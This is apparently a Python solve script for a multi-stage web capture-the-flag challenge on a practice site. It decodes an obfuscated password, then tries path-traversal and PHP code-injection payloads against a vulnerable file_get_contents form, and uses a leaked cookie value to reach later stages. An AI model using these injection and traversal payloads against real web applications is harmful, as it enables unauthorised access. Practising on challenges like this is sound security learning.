# hackers.gg - Web - The Long Lost

import requests
from bs4 import BeautifulSoup

base_url = "http://hackers.gg:8006"
url2 = "http://hackers.gg:8006/stage2.php"

'''
var
p455 = '%77%68%30%30%2c%30%62%66%75%35%63%34%37%31%30%6e%21';
function check()
{
    var 1npu7 = prompt('Gimme that pass: ');
    if (1npu7 == unescape(p455)) {
        alert('thats the one!');
    } else {
        alert('nope');
}
}	

'''

password1 = '%77%68%30%30%2c%30%62%66%75%35%63%34%37%31%30%6e%21'
# print(d.decode('string-escape')) # not working? code is from python 2
password1 = "wh00,0bfu5c4710n!"

r = requests.post(url2, data={'auth': password1})
print(r.content)

# stage2.php
# 		We found this hash: f25a2fc72690b780b2a14e140ef6a9e0-->

url3 = "http://hackers.gg:8006/stage2login.php"
r = requests.post(url3)
print(r.content)

print('\nstage3.php')
url4 = "http://hackers.gg:8006/dir1/dir2/stage3.php"
r = requests.post(url4, data={'uname2': 'itzel', 'pass2': 'iloveyou'})
print(r)
print(r.content)
print(r.headers)
soup = BeautifulSoup(r.content)
soup.prettify()
print(soup)
''' result:
<!DOCTYPE html>
<html>
    <head>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
        <title>Static Code Analysis</title>
    </head>
    <body>
        <p>Hey, I have this PHP that should read the contents of a file. I think it's secure, can you check?</p>
        <p>Input how you'd read the contents of hackers.gg:8006/index.php</p>
        <code>$filetext = file_get_contents($_POST['filename'].'.php');</code><br/><br/>
        <form action="/dir1/dir2/stage3.php" method="post">
            <input name="uname2" type="hidden" value="Itzel"/>
            <input name="pass2" type="hidden" value="iloveyou"/>
            <input name="exploit" type="text"/>
            <input name="submitexploit" type="submit" value="Submit"/>
        </form>
    </body>
</html>
'''

print('\nstage3.php - exploit')
url4 = "http://hackers.gg:8006/dir1/dir2/stage3.php"
r = requests.post(url4, data={'uname2': 'Itzel', 'pass2': 'iloveyou', 'filename': 'index'})
print(r)
print(r.content)
print(r.headers)
soup = BeautifulSoup(r.content)
soup.prettify()
print(soup)

print('\nstage3.php - exploit try 2')
url4 = "http://hackers.gg:8006/dir1/dir2/stage3.php"
r = requests.post(url4,
                  data={'uname2': 'Itzel', 'pass2': 'iloveyou', 'exploit': '/../../index', 'submitexploit': 'Submit'})
print(r)
print(r.headers)
print(r.content)
soup = BeautifulSoup(r.content)
soup.prettify()
print(soup)

print('\nstage3.php - exploit try 3')
url4 = "http://hackers.gg:8006/dir1/dir2/stage3.php"
# r = requests.post(url4, data={'uname2': 'Itzel', 'pass2': 'iloveyou', 'exploit':"index.php'); phpinfo(); print('", 'filename':"index.php'); phpinfo(); print('"})
r = requests.post(url4, data={'uname2': 'Itzel', 'pass2': 'iloveyou', 'exploit': "index.php'); phpinfo(); print('"})
print(r)
print(r.content)
print(r.headers)
soup = BeautifulSoup(r.content)
soup.prettify()
print(soup)

print('\nStage 4: /tgbyhnujmedc.php')
url_stage4 = base_url + '/tgbyhnujmedc.php'
print(url_stage4)
r = requests.get(url_stage4)
print(r)
print(r.headers)
print(r.content)
soup = BeautifulSoup(r.content, 'html.parser')
soup.prettify()
print(soup)

# /images directory
# http://hackers.gg:8006/images/loungepass.txt
'''
louge pass is "OMGTHEWORLDISENDING"
You need to set a cookie "pass" to "OMGTHEWORLDISENDING" to access
'''

# http://hackers.gg:8006/robots.txt
# /MitigatorsLounge.php
url_stage5 = base_url + '/MitigatorsLounge.php'
print(url_stage5)
r = requests.get(url_stage5, cookies={'pass': 'OMGTHEWORLDISENDING'})
print(r)
print(r.headers)
print(r.content)
soup = BeautifulSoup(r.content, 'html.parser')
soup.prettify()
print(soup)

# final.php
url_stage6 = base_url + '/final.php'
print(url_stage6)
r = requests.get(url_stage6, cookies={'pass': 'OMGTHEWORLDISENDING'})
print(r)
print(r.headers)
print(r.content)
soup = BeautifulSoup(r.content, 'html.parser')
soup.prettify()
print(soup)

url_stage7 = base_url + '/finalauth.php'
print(url_stage7)
r = requests.post(url_stage7, cookies={'pass': 'OMGTHEWORLDISENDING'}, data={'submit': 'Submit', 'month': 'December'})
print(r)
print(r.headers)
print(r.content)
soup = BeautifulSoup(r.content, 'html.parser')
soup.prettify()
print(soup)
